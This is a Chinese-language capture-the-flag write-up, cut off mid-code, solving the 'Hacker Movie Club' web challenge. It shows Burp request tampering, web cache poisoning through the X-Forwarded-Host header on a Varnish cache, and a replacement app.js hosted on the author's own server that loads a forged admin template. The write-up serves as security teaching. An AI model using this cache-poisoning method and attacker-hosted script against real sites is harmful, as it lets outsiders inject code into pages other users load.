**cdn.js**
    for (let t of document.head.children) {
    if (t.tagName !== 'SCRIPT')
    continue;
    let { cdn, src } = t.dataset;
    if (cdn === undefined || src === undefined)
    continue;
    fetch(`//${cdn}/cdn/${src}`,{
    headers: {
    'X-Forwarded-Host':cdn
    }}
    ).then(r=>r.blob()).then(b=> {
    let u = URL.createObjectURL(b);
    let s = document.createElement('script');
    s.src = u;
    document.head.appendChild(s);
    });
    }
正如访问如下的返回包
可以看到这里将获取到的`//820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services/cdn/main.mst`
添加上'
    X-Forwarded-Host':820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137    的头部
    GET /cdn/mustache.min.js HTTP/1.1
    Host: 820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services
    Origin: http://app.hm.vulnerable.services
    X-Forwarded-Host: 820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
    Accept: */*
    Referer: http://app.hm.vulnerable.services/
    Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
    If-None-Match: "1536960042.0-9553-2615478926"
    If-Modified-Since: Fri, 14 Sep 2018 21:20:42 GMT
    Accept-Encoding: gzip, deflate
    Connection: close
**/cdn/main.mst**
    Hacker Movie Club
    {{#admin}}
    Welcome to the desert of the real.
    {{/admin}}
     NameYearLength
    {{#movies}}
      {{^admin_only}}
      {{ name }}
      {{ year }}
      {{ length }}
      {{/admin_only}}
    {{/movies}}
很明显这是一个模板文件
之前有做过一道cdn的题，就是admin访问一个不存在的模板文件，然后用户利用cdn直接得到管理员的权限...
这道题有些不同
**/movies**
    {
    "admin": false,
    "movies": [{
    "admin_only": false,
    "length": "1 Hour, 54 Minutes",
    "name": "WarGames",
    "year": 1983
    },
      ··········
    {
    "admin_only": true,
    "length": "22 Hours, 17 Minutes",
    "name": "[REDACTED]",
    "year": 2018
    }]
    }
这里可以看到只有一个admin_only为True，尝试将这里改为flase
    GET /api/movies HTTP/1.1
    Host: app.hm.vulnerable.services
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
    Accept: */*
    Referer: http://app.hm.vulnerable.services/
    Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
    Accept-Encoding: gzip, deflate
    Connection: close
    Burpsuite
    Do intercept >Response to this request
    就可以修改这个包
然后就会显示出来默认设置为true的那项，所以这里可以知道我们的目标就是获取admin的界面，flag应该就在其中。
    Hacker Movie Club
    NameYearLength
    WarGames19831 Hour, 54 Minutes
    Kung Fury   20150 Hours, 31 Minutes
    Sneakers19922 Hours, 6 Minutes
    Swordfish   20011 Hour, 39 Minutes
    The Karate Kid  19842 Hours, 6 Minutes
    Ghost in the Shell  19951 Hour, 23 Minutes
    Serial Experiments Lain 19985 Hours, 16 Minutes
    The Matrix  19992 Hours, 16 Minutes
    Blade Runner19821 Hour, 57 Minutes
    Blade Runner 2049   20172 Hours, 43 Minutes
    Hackers 19951 Hour, 47 Minutes
    TRON19821 Hour, 36 Minutes
    Tron: Legacy20102 Hours, 5 Minutes
    Minority Report 20022 Hours, 25 Minutes
    eXistenZ19992 Hours, 37 Minutes
    [REDACTED]  201822 Hours, 17 Minutes
这下思路就比较清晰了
    app.js ----> Access-Control-Allow-Origin: *
    未知的头部 ---->X-Varnish: 
    少见的头部----->X-Forwarded-Host
    admin的模板文件---->/cdn/main.mst
    然后好像没有什么可以交互的地方.....
Origin: *这么大应该是需要我们的服务器的，admin的模板文件暴露出来，可能需要我们来充当admin，然后没有什么可以交互的地方，
所以关注点就停留在了X-Varnish和X-Forwarded-Host上罕见的东西一般是一个比较简单的考点，期望这个东西可以带来意想不到的效果.....
手册给出如下解释....
[X-Forwarded-Host:](https://cloud.tencent.com/developer/section/1190030)
    X-Forwarded-Host（XFH）报头是用于识别由客户机在所要求的原始主机一个事实上的标准报头Host的 HTTP 请求报头。
    反向代理（负载均衡器，CDN）的主机名称和端口可能与处理请求的源服务器不同，在这种情况下，X-Forwarded-Host头部可用于确定最初使用哪个主机。
    此标题用于调试，统计和生成依赖于位置的内容，并且通过设计它可以显示隐私敏感信息，例如客户端的 IP 地址。因此，在部署此标头时必须牢记用户的隐私。
    句法：X-Forwarded-Host: 
    X-Forwarded-Host: id42.example-cdn.com
好像没什么用
[X-Varnish](https://cloud.tencent.com/developer/article/1114517)
    什么是web cache?
     Web缓存是指一个Web资源(如html页面，图片，js，数据等）存在与Web服务器和客户端(浏览器）直接的副本。缓存会根据进来的请求保存输出内容的副本；当下一个请求到来的时候，如果是相同的URL，缓存会根据缓存机制决定是直接使用副本响应访问请求还是向源服务器再次发送请求。   
    varnish介绍：
     varnish以一款开源的、高性能的http反向代理的缓存软件；
这里就可以知道如果我们服务器的文件被缓存下来就可以搞事情了。
直接搜索X-Forwarded-Host+X-Varnish漏洞利用
这里我参考了这篇[利用HTTP host头攻击的技术 ](http://www.vuln.cn/6771)
这里重点关注缓存污染，而且介绍了X-Forwarded-Host头部的危险性
    题目中有X-Forwarded-Host的文件有
    /cdn/mustache.min.js
    /cdn/app.js
    而且头部会有两种情况
    get options
    get会有X-Forwarded-Host的头部
    options没有
    所以这里暂时推测options其实是访问get的缓存(这里纯属个人推断，有问题希望大师傅们指出)
所以这里我们需要控制第一个(get)，然后后续访问我们的缓存
直接burp
    spiner->clear$
    payload->type->Null payload
       ->Continue indefinitely
    Options->thread 20足以
我反复发了如下包(当然是没有这个域名的)
    GET /cdn/app.js HTTP/1.1
    Host: 820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services
    Origin: http://app.hm.vulnerable.services
    X-Forwarded-Host: the.King.Of.Night
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
    Accept: */*
    Referer: http://app.hm.vulnerable.services/
    Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
    Accept-Encoding: gzip, deflate
    Connection: close
然后打开浏览器，访问(这里我用的谷歌)
    F12->Network中可以看到main.mst为红色
    点开发现Failed to load response data
    blob:http://app.hm.vulnerable.services/d4432a3a-0c26-4a04-a01b-8efab0d71dc9:5 GET http://the.king.of.night/cdn/main.mst 0 ()
    (anonymous) @ blob:http://app.hm.vulnerable.services/d4432a3a-0c26-4a04-a01b-8efab0d71dc9:5
这里可以看到we did it!!!!
不过我设置的X-Forwarded-Host: the.King.Of.Night，变成了the.king.of.night，好像和域名都是小写字母一样吧
剩下目标就很明确了，我们要成为admin，在服务器上根据admin的模板文件进行布置
在服务器上布置app.js,main.mst，继续无限发包
**main.mst**
    Hacker Movie Club
    Welcome to the desert of the real.
     NameYearLength
    {{#movies}}
      {{ name }}
      {{ year }}
      {{ length }}
    {{/movies}}
**app.js**
    var token = null;
    Promise.all([
    fetch('/api/movies').then(r=>r.json()),
    fetch(`//188.xxx.xxx.xxx/cdn/main.mst`).then(r=>r.text()),
    new Promise((resolve) => {
    if (window.loaded_recapcha === true)
    return resolve();
    window.loaded_recapcha = resolve;
    }),
    new Promise((resolve) => {
    if (window.loaded_mustache === true)
    return resolve();
    window.loaded_mustache = resolve;
    })
    ]).then(([user, view])=>{
    document.getElementById('content').innerHTML = Mustache.render(view,user);
    grecaptcha.render(document.getElementById("captcha"), {
    sitekey: '6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5',
    theme: 'dark',
    callback: t=> {
    token = t;
    document.getElementById('report').disabled = false;
    }
    });
    let hidden = true;
    document.getElementById('report').onclick = () => {
    if (hidden) {
      document.getElementById("captcha").parentElement.style.display='block';
      document.getElementById('report').disabled = true;
      hidden = false;
      return;
    }
    fetch('/api/report',{
    method: 'POST',
    body: JSON.stringify({token:token})
    }).then(r=>r.json()).then(j=>{
    if (j.success) {
    // The admin is on her way to check the page
    alert("Neo... nobody has ever done this before.");
    alert("That's why it's going to work.");
    } else {
    alert("Dodge this.");